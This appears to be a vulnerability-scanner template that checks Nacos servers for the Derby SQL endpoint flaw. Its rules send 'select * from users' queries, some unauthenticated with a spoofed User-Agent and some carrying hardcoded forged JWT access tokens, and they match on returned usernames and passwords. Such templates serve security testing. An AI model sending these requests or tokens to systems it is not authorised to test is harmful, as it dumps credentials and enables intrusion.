id: nacos-derby-rce

info:
  name: Nacos Derby 远程代码执行 RCE
  author: zan8in
  severity: critical
  verified: true
  reference:
    - https://github.com/Wileysec/nacos_derby_rce
  tags: nacos,derby,rce
  created: 2024/07/20

set:
  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
  token2: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMDUwNDAxOX0.vW8mpBNoJ7hVKPNhEtQl4Z5b00G4P9Ktrn_7c58crOk
  token3: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ
rules:
  r01:
    request:
      method: GET
      path: /nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20
      headers:
        User-Agent: "Nacos-Server"
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'"USERNAME":') &&
      response.body.bcontains(b'"PASSWORD":')
  r02:
    request:
      method: GET
      path: /nacos/v1/cs/ops/derby
      headers:
        User-Agent: "Nacos-Server"
    expression: |
      response.status == 500 && response.body.bcontains(b"caused: Required request parameter")

  r11:
    request:
      method: GET
      path: /nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20&accessToken={{token}}
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'"USERNAME":') &&
      response.body.bcontains(b'"PASSWORD":')
  r12:
    request:
      method: GET
      path: /nacos/v1/cs/ops/derby?&accessToken={{token}}
    expression: |
      response.status == 500 && response.body.bcontains(b"caused: Required request parameter")

  r21:
    request:
      method: GET
      path: /nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20&accessToken={{token2}}
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'"USERNAME":') &&
      response.body.bcontains(b'"PASSWORD":')
  r22:
    request:
      method: GET
      path: /nacos/v1/cs/ops/derby?&accessToken={{token2}}
    expression: |
      response.status == 500 && response.body.bcontains(b"caused: Required request parameter")

  r31:
    request:
      method: GET
      path: /nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20&accessToken={{token3}}
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'"USERNAME":') &&
      response.body.bcontains(b'"PASSWORD":')
  r32:
    request:
      method: GET
      path: /nacos/v1/cs/ops/derby?&accessToken={{token3}}
    expression: |
      response.status == 500 && response.body.bcontains(b"caused: Required request parameter")

extractors:
  - type: word
    extractor:
      tips: "Manual verification is needed (需要人工验证)"
expression: (r01() && r02()) || (r11() && r12()) || (r21() && r22()) || (r31() && r32())
